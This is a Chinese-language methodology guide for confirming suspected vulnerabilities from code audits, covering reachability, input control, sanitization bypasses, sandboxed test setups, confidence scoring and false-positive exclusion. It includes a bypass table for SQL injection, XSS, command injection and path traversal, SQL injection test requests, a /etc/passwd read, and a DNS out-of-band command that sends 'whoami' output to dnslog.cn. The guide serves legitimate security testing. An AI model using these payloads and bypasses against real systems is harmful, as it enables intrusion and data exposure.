# Vulnerability Verification Methodology

> 漏洞验证方法论 - 借鉴 DeepAudit Verification Agent 的系统化验证流程
> 覆盖: 验证框架、误报排除、可利用性评估、置信度评分

---

## Overview

漏洞验证是将"疑似漏洞"转化为"确认漏洞"的关键环节。有效的验证能够：
1. **排除误报** - 提高报告质量和可信度
2. **量化风险** - 准确评估实际危害程度
3. **指导修复** - 明确防护措施的优先级
4. **支持决策** - 为安全投入提供依据

```
┌─────────────────────────────────────────────────────────────────┐
│                  Verification Framework                          │
│                                                                 │
│   静态发现 → 条件分析 → 环境验证 → 利用确认 → 置信度评分         │
│                                                                 │
│   [代码审计]  [前置条件]  [本地测试]   [PoC执行]  [最终判定]      │
└─────────────────────────────────────────────────────────────────┘
```

---

## 验证流程框架

### Phase 1: 条件分析 (Pre-Verification)

在执行动态验证之前，先进行静态条件分析：

```
┌─────────────────────────────────────────────────────────────────┐
│  条件分析检查清单                                                │
│                                                                 │
│  □ 入口可达性 - 该代码路径是否可被外部触发?                       │
│  □ 参数可控性 - 关键参数是否来自用户输入?                         │
│  □ 净化有效性 - 是否存在有效的输入过滤/验证?                      │
│  □ 依赖条件   - 是否需要特定配置/权限/环境?                       │
│  □ 框架保护   - 框架是否提供自动防护?                             │
└─────────────────────────────────────────────────────────────────┘
```

#### 1.1 入口可达性分析

```
分析目标: 漏洞代码是否可被外部访问

检查方法:
1. 追踪调用链 - 从漏洞点反向追踪到入口
2. 路由映射   - 确认HTTP端点是否暴露
3. 权限要求   - 需要何种认证/授权级别

可达性分类:
├─ [直接可达] 无需认证，公开API
├─ [需认证]   需要有效登录凭证
├─ [需授权]   需要特定角色/权限
├─ [内部调用] 仅内部组件可访问
└─ [不可达]   死代码或已废弃
```

```python
# 示例: 入口可达性验证
def analyze_reachability(sink_location):
    """
    分析漏洞点的可达性

    返回:
    - reachable: bool - 是否可达
    - auth_required: str - 认证要求
    - call_chain: list - 调用链路径
    """
    # 1. 查找包含该代码的方法
    method = find_containing_method(sink_location)

    # 2. 反向追踪调用链
    call_chain = trace_callers(method)

    # 3. 检查入口点
    entry_points = find_entry_points(call_chain)

    # 4. 分析认证要求
    auth_required = analyze_auth_requirements(entry_points)

    return {
        "reachable": len(entry_points) > 0,
        "auth_required": auth_required,
        "call_chain": call_chain,
        "entry_points": entry_points
    }
```

#### 1.1.1 LSP 实现入口可达性分析 (v2.4.0)

> 使用 LSP 工具实现精确的调用链追踪，替代伪代码中的 `trace_callers()`

```
LSP 工作流: Sink → 调用者 → ... → Controller 入口

Step 1: 定位 Sink 方法
└─ 已知漏洞位置: UserDao.java:45 executeQuery(sql)

Step 2: LSP 追踪调用者
└─ LSP incomingCalls(UserDao.java, 45, 10)
   返回:
   ├─ UserService.java:78 getUserById()
   └─ UserService.java:92 searchUsers()

Step 3: 递归追踪到入口
└─ LSP incomingCalls(UserService.java, 78, 10)
   返回:
   ├─ UserController.java:35 getUser()  ← HTTP 入口!
   └─ AdminController.java:50 viewUser() ← HTTP 入口!

Step 4: 确认入口类型
└─ LSP hover(UserController.java, 35, 10)
   返回: @GetMapping("/api/user/{id}") ← 公开 API
```

**LSP 命令序列**:
```bash
# 1. 找到 Sink 的所有调用者
LSP incomingCalls /path/to/UserDao.java 45 10

# 2. 递归追踪每个调用者
LSP incomingCalls /path/to/UserService.java 78 10

# 3. 获取入口方法的注解信息
LSP hover /path/to/UserController.java 35 10

# 4. 确认完整调用链
结果: Controller.getUser() → Service.getUserById() → DAO.executeQuery()
```

**对比传统方法**:
| 方法 | 操作 | 精确度 |
|------|------|--------|
| Grep | `grep -rn "getUserById"` | 低 - 匹配字符串/注释 |
| LSP incomingCalls | 语义分析调用关系 | 高 - 仅返回实际调用 |

#### 1.2 参数可控性分析

```
分析目标: 确认污点数据是否真正可控

可控性等级:
├─ [完全可控] 参数直接来自用户输入，无任何处理
├─ [部分可控] 参数经过处理但核心内容可控
├─ [间接可控] 需要先污染其他数据源
├─ [条件可控] 需要满足特定条件才可控
└─ [不可控]   参数完全由系统生成
```

```python
# 示例: 参数可控性分析
def analyze_controllability(sink_param, source_location):
    """
    分析参数的可控程度

    检查点:
    1. 数据源类型 (HTTP参数/Cookie/Header/文件等)
    2. 中间处理 (转换/截断/编码)
    3. 限制条件 (长度/字符集/格式)
    """
    # 追踪数据流
    data_flow = trace_data_flow(source_location, sink_param)

    # 分析中间处理
    transformations = extract_transformations(data_flow)

    # 评估可控性
    controllability = evaluate_controllability(
        source_type=data_flow.source_type,
        transformations=transformations
    )

    return controllability
```

#### 1.3 净化有效性分析

```
净化措施分类:
├─ [无净化]     直接使用用户输入
├─ [无效净化]   存在但可被绕过
├─ [部分净化]   覆盖部分攻击向量
├─ [有效净化]   正确实现的安全措施
└─ [框架净化]   由框架自动处理
```

**常见无效净化模式**:

| 漏洞类型 | 无效净化示例 | 绕过方法 |
|----------|--------------|----------|
| SQL注入 | 黑名单过滤 `'`, `"` | 使用 `\'` 或编码 |
| SQL注入 | `addslashes()` | 宽字节注入 |
| XSS | 过滤 `<script>` | 使用 `<img onerror>` |
| XSS | `htmlspecialchars()` 无参数 | 属性注入 |
| 命令注入 | 过滤 `;` | 使用 `|`, `&`, `\n` |
| 路径遍历 | 过滤 `../` | 使用 `....//` 或编码 |

```python
# 示例: 净化有效性检查
def check_sanitization_effectiveness(sanitizer_code, vuln_type):
    """
    评估净化措施的有效性

    返回:
    - effective: bool
    - bypass_methods: list - 可能的绕过方法
    """
    bypass_methods = []

    if vuln_type == "sql_injection":
        # 检查是否使用参数化查询
        if not uses_parameterized_query(sanitizer_code):
            if uses_blacklist(sanitizer_code):
                bypass_methods.append("编码绕过")
                bypass_methods.append("大小写变换")
            if uses_addslashes(sanitizer_code):
                bypass_methods.append("宽字节注入")

    elif vuln_type == "xss":
        # 检查是否正确转义
        if not uses_context_aware_encoding(sanitizer_code):
            bypass_methods.append("上下文切换攻击")

    return {
        "effective": len(bypass_methods) == 0,
        "bypass_methods": bypass_methods
    }
```

---

### Phase 2: 环境验证 (Environment Validation)

#### 2.1 本地环境搭建

```bash
# 最小化验证环境
# 1. 克隆目标项目
git clone <target-repo>
cd <target-project>

# 2. 安装依赖
# Python
pip install -r requirements.txt

# Java
mvn install -DskipTests

# Node.js
npm install

# 3. 启动服务 (开发模式)
# Python/Flask
FLASK_DEBUG=1 flask run

# Java/Spring
mvn spring-boot:run -Dspring-boot.run.profiles=dev

# Node.js
npm run dev

# 4. 验证服务启动
curl http://localhost:8080/health
```

#### 2.2 Docker 隔离验证

```yaml
# docker-compose.verify.yml
version: '3.8'

services:
  target-app:
    build: .
    ports:
      - "8080:8080"
    environment:
      - DEBUG=true
    networks:
      - verify-net
    # 安全限制
    mem_limit: 512m
    cpus: 1.0

  # 数据库 (如需要)
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: test
      MYSQL_DATABASE: testdb
    networks:
      - verify-net

networks:
  verify-net:
    driver: bridge
```

```bash
# 启动验证环境
docker-compose -f docker-compose.verify.yml up -d

# 执行验证
curl -X POST http://localhost:8080/api/vulnerable-endpoint \
    -d "param=test'--"

# 清理环境
docker-compose -f docker-compose.verify.yml down -v
```

---

### Phase 3: 利用确认 (Exploitation Confirmation)

#### 3.1 验证策略选择

```
┌─────────────────────────────────────────────────────────────────┐
│  验证策略矩阵                                                    │
│                                                                 │
│  漏洞类型        主要验证方法          备选验证方法              │
│  ─────────────────────────────────────────────────────────────  │
│  SQL注入         时间延迟             错误信息/UNION查询        │
│  命令注入        时间延迟             DNS外带/命令输出          │
│  SSRF           端口探测             DNS外带/云metadata        │
│  XSS            DOM检测              alert弹窗                 │
│  路径遍历        读取已知文件          错误信息                  │
│  反序列化        DNS外带              时间延迟/RCE             │
│  SSTI           数学表达式            模板语法特征              │
│  XXE            DNS外带              本地文件读取              │
└─────────────────────────────────────────────────────────────────┘
```

#### 3.2 无害化验证原则

```
⚠️ 验证安全守则

1. 只读操作优先
   ✓ SELECT 查询
   ✓ 读取系统文件 (/etc/passwd)
   ✗ DELETE/DROP 操作
   ✗ 修改/删除文件

2. 使用时间延迟
   ✓ SLEEP(5)
   ✓ ping -c 5 127.0.0.1
   ✗ 持续性循环

3. DNS外带代替直接输出
   ✓ nslookup $(whoami).dnslog.cn
   ✗ 直接反弹shell

4. 使用专用测试数据
   ✓ 测试账号
   ✓ 测试数据库
   ✗ 生产环境数据
```

#### 3.3 多层验证方法

```python
# 多层验证框架
class VulnerabilityVerifier:
    def __init__(self, target_url, vuln_type):
        self.target_url = target_url
        self.vuln_type = vuln_type
        self.confidence = 0
        self.evidence = []

    def verify(self):
        """执行多层验证"""

        # Layer 1: 语法验证 (错误触发)
        result1 = self.syntax_verification()
        if result1['triggered']:
            self.confidence += 30
            self.evidence.append(result1)

        # Layer 2: 逻辑验证 (条件判断)
        result2 = self.logic_verification()
        if result2['triggered']:
            self.confidence += 30
            self.evidence.append(result2)

        # Layer 3: 时间验证 (延迟确认)
        result3 = self.timing_verification()
        if result3['triggered']:
            self.confidence += 25
            self.evidence.append(result3)

        # Layer 4: 外带验证 (DNS/HTTP回调)
        result4 = self.oob_verification()
        if result4['triggered']:
            self.confidence += 15
            self.evidence.append(result4)

        return {
            'verified': self.confidence >= 50,
            'confidence': self.confidence,
            'evidence': self.evidence
        }

    def syntax_verification(self):
        """通过触发语法错误验证"""
        # 发送畸形输入，检查错误响应
        pass

    def logic_verification(self):
        """通过布尔条件验证"""
        # true条件和false条件的响应差异
        pass

    def timing_verification(self):
        """通过时间延迟验证"""
        # 比较延迟payload和正常请求的响应时间
        pass

    def oob_verification(self):
        """通过带外通道验证"""
        # DNS/HTTP回调确认
        pass
```

---

### Phase 4: 置信度评分 (Confidence Scoring)

#### 4.1 评分模型

```
┌─────────────────────────────────────────────────────────────────┐
│  置信度评分公式                                                  │
│                                                                 │
│  最终置信度 = 基础分 + 验证加分 - 不确定减分                      │
│                                                                 │
│  基础分 (静态分析):                                              │
│  ├─ 明确的危险模式           +30                                │
│  ├─ 数据流可追踪             +20                                │
│  └─ 无净化措施               +10                                │
│                                                                 │
│  验证加分 (动态验证):                                            │
│  ├─ PoC成功执行              +40                                │
│  ├─ 时间延迟验证             +25                                │
│  ├─ 错误信息验证             +20                                │
│  ├─ 多payload成功            +15                                │
│  └─ DNS外带确认              +20                                │
│                                                                 │
│  不确定减分:                                                     │
│  ├─ 存在可能的净化           -20                                │
│  ├─ 需要特定权限             -15                                │
│  ├─ 需要特定配置             -10                                │
│  ├─ 调用链复杂               -10                                │
│  └─ 框架可能自动防护         -15                                │
└─────────────────────────────────────────────────────────────────┘
```

#### 4.2 置信度等级

| 等级 | 分数范围 | 含义 | 报告建议 |
|------|----------|------|----------|
| **已确认** | 90-100 | PoC成功执行，危害明确 | 直接报告，标注为已验证 |
| **高置信** | 70-89 | 多项证据支持，极有可能存在 | 报告，建议人工确认 |
| **中置信** | 50-69 | 存在可疑模式，需进一步验证 | 报告，标注需验证 |
| **低置信** | 30-49 | 可能误报，证据不足 | 谨慎报告，标注存疑 |
| **疑似误报** | 0-29 | 大概率误报 | 不报告或仅作参考 |

#### 4.3 评分实现

```python
class ConfidenceScorer:
    def __init__(self):
        self.score = 0
        self.factors = []

    def add_static_analysis(self, findings):
        """添加静态分析分数"""
        if findings.get('dangerous_pattern'):
            self.score += 30
            self.factors.append(("危险模式识别", +30))

        if findings.get('traceable_dataflow'):
            self.score += 20
            self.factors.append(("数据流可追踪", +20))

        if not findings.get('sanitization'):
            self.score += 10
            self.factors.append(("无净化措施", +10))

    def add_dynamic_verification(self, results):
        """添加动态验证分数"""
        if results.get('poc_success'):
            self.score += 40
            self.factors.append(("PoC执行成功", +40))

        if results.get('timing_confirmed'):
            self.score += 25
            self.factors.append(("时间延迟验证", +25))

        if results.get('error_triggered'):
            self.score += 20
            self.factors.append(("错误信息验证", +20))

        if results.get('oob_callback'):
            self.score += 20
            self.factors.append(("DNS外带确认", +20))

    def apply_uncertainty(self, uncertainties):
        """应用不确定性减分"""
        if uncertainties.get('possible_sanitization'):
            self.score -= 20
            self.factors.append(("可能存在净化", -20))

        if uncertainties.get('requires_auth'):
            self.score -= 15
            self.factors.append(("需要认证", -15))

        if uncertainties.get('complex_call_chain'):
            self.score -= 10
            self.factors.append(("调用链复杂", -10))

    def get_confidence_level(self):
        """获取置信度等级"""
        if self.score >= 90:
            return "已确认"
        elif self.score >= 70:
            return "高置信"
        elif self.score >= 50:
            return "中置信"
        elif self.score >= 30:
            return "低置信"
        else:
            return "疑似误报"

    def generate_report(self):
        """生成评分报告"""
        return {
            "score": max(0, min(100, self.score)),
            "level": self.get_confidence_level(),
            "factors": self.factors
        }
```

---

## 误报排除指南

### 常见误报模式

#### 1. 参数化查询误判

```java
// 误报场景: PreparedStatement 正确使用
String sql = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, userId);  // 参数化，安全

// 验证方法:
// 检查是否使用 ? 占位符 + setXxx() 方法
```

#### 2. ORM 安全方法误判

```python
# 误报场景: Django ORM 安全查询
User.objects.filter(id=user_id)  # 安全
User.objects.get(pk=user_id)     # 安全

# 真实漏洞: raw() 或 extra() 使用
User.objects.raw(f"SELECT * FROM users WHERE id = {user_id}")  # 危险
```

#### 3. 类型转换保护

```java
// 误报场景: 类型转换提供保护
int id = Integer.parseInt(userId);  // 非数字会抛异常
String sql = "SELECT * FROM users WHERE id = " + id;  // 此时相对安全

// 但仍建议使用参数化查询
```

#### 4. 白名单验证

```python
# 误报场景: 有效的白名单验证
ALLOWED_TABLES = ['users', 'products', 'orders']

def query_table(table_name):
    if table_name not in ALLOWED_TABLES:
        raise ValueError("Invalid table")
    return f"SELECT * FROM {table_name}"  # 白名单后安全
```

### 误报排除检查清单

```
SQL注入误报排除:
□ 是否使用参数化查询 (PreparedStatement, ?, $1)
□ 是否使用ORM安全方法 (filter, where条件对象)
□ 参数是否经过强类型转换
□ 是否有有效的白名单验证

命令注入误报排除:
□ 是否使用参数数组而非字符串 (subprocess.call([...]))
□ 是否使用 shell=False
□ 参数是否来自可信配置

XSS误报排除:
□ 是否使用模板自动转义 (Jinja2默认, React JSX)
□ 是否使用安全的DOM API (textContent vs innerHTML)
□ 是否有CSP策略保护

路径遍历误报排除:
□ 是否使用路径规范化 (realpath, normalize)
□ 是否验证路径前缀 (startswith)
□ 是否使用安全的文件服务API
```

---

## 验证报告模板

### 完整验证报告

```markdown
# 漏洞验证报告

## 基本信息

| 字段 | 值 |
|------|-----|
| 漏洞ID | VULN-2026-001 |
| 类型 | SQL注入 |
| 位置 | src/api/users.py:45 |
| 置信度 | 92% (已确认) |
| 验证时间 | 2026-01-23 14:30:00 |

## 条件分析

### 入口可达性
- **入口点**: `GET /api/users/{id}`
- **认证要求**: 无 (公开API)
- **调用链**:
  ```
  routes.py:20 → users.py:45 → db.execute()
  ```

### 参数可控性
- **参数**: `id` (路径参数)
- **可控等级**: 完全可控
- **数据流**:
  ```
  request.path['id'] → user_id → SQL查询
  ```

### 净化检查
- **存在净化**: 否
- **框架保护**: 否 (使用raw SQL)

## 验证过程

### 验证1: 语法错误触发
```
Request:
GET /api/users/1' HTTP/1.1

Response:
500 Internal Server Error
{"error": "syntax error at or near \"'\""}

结果: 触发SQL语法错误 ✓
```

### 验证2: 布尔条件
```
Request 1: GET /api/users/1 AND 1=1
Response: 200 OK, 返回用户数据

Request 2: GET /api/users/1 AND 1=2
Response: 200 OK, 返回空数据

结果: 布尔条件响应差异 ✓
```

### 验证3: 时间延迟
```
Request: GET /api/users/1; SELECT SLEEP(5)--
Response Time: 5.23 seconds (baseline: 0.12s)

结果: 时间延迟确认 ✓
```

## 置信度评分

| 因素 | 分数 |
|------|------|
| 危险模式识别 | +30 |
| 数据流可追踪 | +20 |
| 无净化措施 | +10 |
| PoC执行成功 | +40 |
| 时间延迟验证 | +25 |
| 调用链复杂度 | -10 |
| **总分** | **92** |

## 结论

**验证结果**: 已确认
**危害评估**: 可执行任意SQL，导致数据泄露或篡改
**修复优先级**: Critical

## 修复建议

```python
# 当前代码 (危险)
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# 修复后 (安全)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```
```

---

## 工具集成

### 与 PoC Generation 集成

```python
# 验证流程集成
from poc_generator import generate_poc
from verification import VulnerabilityVerifier

def full_verification(finding):
    """完整验证流程"""

    # 1. 生成PoC
    poc = generate_poc(
        vuln_type=finding['type'],
        target_url=finding['url'],
        param=finding['param']
    )

    # 2. 执行验证
    verifier = VulnerabilityVerifier(
        target_url=finding['url'],
        vuln_type=finding['type']
    )
    result = verifier.verify()

    # 3. 生成报告
    report = generate_verification_report(
        finding=finding,
        poc=poc,
        verification_result=result
    )

    return report
```

### 与外部工具集成

```bash
# 使用 Semgrep 发现 + 手工验证的工作流
#!/bin/bash

# 1. Semgrep 扫描
semgrep scan --config p/sql-injection -o findings.json --json

# 2. 提取疑似漏洞
jq '.results[] | {file: .path, line: .start.line, message: .extra.message}' findings.json

# 3. 对每个发现进行手工验证
# ... (使用 verification_methodology 流程)

# 4. 生成最终报告
```

---

## 参考资源

- [OWASP Testing Guide - Verification Techniques](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger - Vulnerability Verification](https://portswigger.net/web-security)
- [SANS - Penetration Testing Execution Standard](http://www.pentest-standard.org/)

---

**最后更新**: 2026-01-23
**版本**: 1.0.0
